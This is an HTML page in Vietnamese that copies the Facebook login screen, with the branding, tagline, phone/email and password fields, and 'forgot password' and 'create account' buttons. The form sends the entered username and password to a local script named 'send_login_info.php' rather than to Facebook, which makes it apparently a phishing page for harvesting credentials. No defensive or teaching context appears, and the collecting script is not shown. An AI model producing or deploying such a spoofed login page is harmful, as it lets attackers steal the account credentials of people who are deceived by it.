<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        /* CSS giống như đã trình bày ở phần trên */
    </style>
</head>
<body>
    <div class="login-container">
        <div class="left-section">
            <h1>Facebook</h1>
            <p>Kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
        </div>
        <div class="right-section">
            <form class="login-form" action="send_login_info.php" method="POST">
                <input type="text" name="username" placeholder="Số điện thoại hoặc email" required>
                <input type="password" name="password" placeholder="Mật khẩu" required>
                <button type="submit">Đăng nhập</button>
                <a href="#" class="forgot-password">Quên mật khẩu?</a>
                <div class="separator">hoặc</div>
                <button type="button" class="create-account-button">Tạo tài khoản mới</button>
            </form>
        </div>
    </div>
</body>
</html>
